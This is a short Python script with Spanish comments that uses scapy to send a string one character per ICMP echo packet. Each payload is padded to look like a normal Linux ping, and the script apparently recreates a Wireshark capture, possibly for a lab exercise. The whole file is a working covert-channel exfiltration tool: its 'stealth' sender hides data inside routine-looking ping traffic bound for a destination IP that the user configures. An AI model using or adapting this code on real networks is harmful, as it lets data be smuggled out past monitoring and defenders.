import sys
import time
from scapy.all import IP, ICMP, send, sr1

def generar_payload_exacto(caracter):
    # En la imagen, el payload mide 48 bytes.
    # El primer byte es nuestro caracter exfiltrado.
    char_byte = caracter.encode()
    
    # El resto del payload (47 bytes) debe ser relleno.
    # Según la imagen de Wireshark, el relleno parece ser una secuencia incremental
    # que empieza después de unos nulos. Vamos a recrear esa estructura de bytes:
    relleno = bytes(range(0x00, 47)) 
    
    return char_byte + relleno

def enviar_paquete_stealth(objetivo, caracter, seq):
    payload = generar_payload_exacto(caracter)
    
    # Construcción del paquete imitando la estructura de la imagen
    # IP: ttl 64 (Linux), ICMP: id fijo y secuencia incremental
    pkt = IP(dst=objetivo, ttl=64)/ICMP(id=0x1234, seq=seq)/payload
    
    send(pkt, verbose=False)

def mostrar_ping_real(objetivo):
    print(f"[*] Verificando línea base hacia {objetivo}...")
    # Enviamos un ping normal del sistema para comparar
    res = sr1(IP(dst=objetivo)/ICMP(), timeout=2, verbose=False)
    if res:
        print(f"    [REAL] ID: {res[ICMP].id} | Seq: {res[ICMP].seq} | Data Size: {len(res.load)} bytes")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print('Uso: sudo python3 pingv4.py "texto cifrado"')
        sys.exit(1)

    texto_cifrado = sys.argv[1]
    ip_objetivo = "127.0.0.1" # Cambiar por la IP de destino necesaria

    # Mostrar estado PREVIO
    mostrar_ping_real(ip_objetivo)
    print("-" * 30)

    # Envío de caracteres
    for i, letra in enumerate(texto_cifrado):
        enviar_paquete_stealth(ip_objetivo, letra, i + 1)
        print("Sent 1 packets.") # Tal cual aparece en tu captura
        time.sleep(0.5)

    # Mostrar estado POSTERIOR
    print("-" * 30)
    mostrar_ping_real(ip_objetivo)
    print(f"\n[!] Proceso finalizado. El último carácter enviado fue: '{texto_cifrado[-1]}'")